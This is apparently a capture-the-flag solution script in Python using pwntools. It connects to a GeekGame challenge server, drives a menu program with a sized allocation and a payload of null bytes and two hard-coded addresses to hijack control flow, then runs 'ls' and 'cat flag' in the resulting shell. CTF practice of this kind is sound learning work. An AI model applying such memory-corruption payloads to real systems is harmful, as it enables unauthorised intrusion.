from pwn import *

TOKEN = b'<token_is_deleted>'


def main():
    c = remote("prob12.geekgame.pku.edu.cn", 10012)
    c.sendline(TOKEN)
    c.recv(8192)
    c.recv(8192)

    def send(b):
        c.sendline(b)
        print("Send: ", b)
        x = c.recv(8192)
        print(x)
        time.sleep(0.1)

    send(b'1')
    send(b'0')
    send(bytes(str(512-24-24), 'utf-8'))
    send(b'')

    send(b'1')
    send(b'1')
    send(b'0')
    send(b'\x00' * 8 + p64(0x040152C) + p64(0x040122C))

    send(b'4')
    send(b'ls')
    send(b'cat flag')

    c.interactive()

    # x = c.recv(8192 * 4).decode()
    # print(x)

    c.clean()
    c.close()


if __name__ == "__main__":
    main()


# c.interactive()
